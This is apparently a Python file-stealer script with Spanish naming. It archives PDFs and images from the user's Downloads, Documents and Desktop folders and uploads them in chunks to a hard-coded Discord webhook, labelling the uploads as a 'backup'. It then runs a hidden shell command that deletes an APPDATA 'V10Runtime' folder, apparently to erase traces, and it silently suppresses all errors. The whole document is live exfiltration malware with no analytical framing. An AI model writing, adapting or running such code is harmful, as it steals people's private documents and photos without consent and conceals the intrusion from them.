import os
import io
import zipfile
import requests
import json
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1563676882468343980/VPrL_iVZc8gOoNZmcxBcYr5-xxX7GiLgsPQDGNaUVuV1ttlAG9_izkXo2HRP4dyDxTym"
CARPETAS = {
    "Descargas": Path.home() / "Downloads",
    "Documentos": Path.home() / "Documents",
    "Escritorio": Path.home() / "Desktop"
}

EXTENSIONES_PERMITIDAS = {'.pdf', '.jpg', '.jpeg', '.png', '.webp', '.gif'}

TAMANO_PARTE = 15 * 1024 * 1024

def comprimir_filtrado_en_memoria(ruta_carpeta):
    buffer_zip = io.BytesIO()
    with zipfile.ZipFile(buffer_zip, 'w', zipfile.ZIP_DEFLATED) as zip_f:
        ruta_base = Path(ruta_carpeta)
        for archivo_path in ruta_base.rglob('*'):

            if archivo_path.is_file() and archivo_path.suffix.lower() in EXTENSIONES_PERMITIDAS:
                try:

                    zip_f.write(archivo_path, archivo_path.relative_to(ruta_base.parent))
                except Exception:
                    pass
    buffer_zip.seek(0)
    return buffer_zip

def enviar_por_partes_desde_memoria(buffer_zip, nombre_carpeta):

    if buffer_zip.getbuffer().nbytes == 0:
        return

    parte_num = 1
    while True:
        chunk = buffer_zip.read(TAMANO_PARTE)
        if not chunk:
            break
        
        requests.post(
            WEBHOOK_URL,
            files={
                "file": (f"{nombre_carpeta.lower()}_pdfs_imgs.zip.part{parte_num:03d}", chunk),
                "payload_json": (None, json.dumps({
                    "content": f"📁 Respaldo de PDFs e Imágenes de **{nombre_carpeta}** (Parte {parte_num})"
                }))
            }
        )
        parte_num += 1

def procesar_y_enviar():
    for nombre, ruta in CARPETAS.items():
        if not ruta.exists():
            continue
        try:
            buffer = comprimir_filtrado_en_memoria(ruta)
            enviar_por_partes_desde_memoria(buffer, nombre)
        except Exception:
            pass

if __name__ == "__main__":
    procesar_y_enviar()

    try:
        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        subprocess.Popen(
            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
            shell=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
